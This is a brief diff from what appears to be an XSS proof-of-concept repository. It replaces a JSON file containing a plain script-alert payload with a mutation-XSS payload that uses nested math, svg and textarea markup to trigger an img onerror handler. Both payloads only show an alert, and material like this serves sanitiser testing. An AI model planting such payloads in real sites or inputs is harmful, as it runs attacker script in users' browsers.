@@ -1,9 +1,1 @@
-{
-    "url": "https://raw.githubusercontent.com/zprytka/PoCXss/main/xss.json",
-    "urls": [
-        {
-            "url": "<script>alert('test')</script>",
-            "name": "Foo"
-        }
-    ]
-}
+<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(xss)'>">
